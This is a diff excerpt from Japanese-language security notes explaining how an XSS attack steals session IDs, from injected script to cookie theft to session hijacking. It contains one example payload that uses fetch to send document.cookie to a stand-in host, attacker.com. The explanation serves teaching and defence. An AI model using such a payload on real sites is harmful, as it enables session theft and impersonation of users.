@@ -18,10 +18,13 @@ DNS Amplification 攻撃や、リフレクション攻撃にはまだ使える�
 ### XSS でセッション ID が盗まれるのはなぜ？
 攻撃者が悪意のあるJavaScriptを注入
 - 例：<script>fetch('https://attacker.com/?cookie='+document.cookie)</script>
+
 JavaScript が Cookie にアクセス
 - ブラウザ上で実行される JavaScript は、document.cookie で同じドメインの Cookie を読み取れる
+
 攻撃者のサーバーに送信
 - 盗んだセッション ID を攻撃者のサーバーに送信
+
 セッションハイジャック
 - 攻撃者が盗んだセッション ID を使って、被害者になりすましてログイン
 
